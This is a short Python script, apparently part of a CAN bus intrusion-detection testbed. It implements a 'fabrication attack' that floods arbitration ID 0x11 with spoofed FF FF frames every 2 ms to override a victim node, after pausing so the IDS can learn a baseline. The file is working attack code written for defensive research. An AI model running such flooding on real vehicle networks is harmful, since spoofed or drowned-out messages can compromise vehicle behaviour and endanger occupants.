"""
ATTACKER NODE
Implements 'Fabrication Attack' (Section 3.2).
Floods ID 0x11 to override the legitimate victim.
"""
import time
import can
from bus_config import get_bus

def run_attack():
    bus = get_bus()
    print("😈 Attacker Active.")
    print("   Waiting 5 seconds to let IDS learn the baseline...")
    time.sleep(5)
    
    print("\n🔥 LAUNCHING FABRICATION ATTACK!")
    print("   Injecting ID 0x11 at high frequency...")
    
    try:
        while True:
            # Flooding: Send 0x11 very fast (every 2ms)
            msg = can.Message(arbitration_id=0x11, data=b'\xFF\xFF', is_extended_id=False)
            bus.send(msg)
            
            # This is 25x faster than the victim (0.05s)
            time.sleep(0.002)

    except KeyboardInterrupt:
        print("🛑 Attack stopped.")

if __name__ == "__main__":
    run_attack()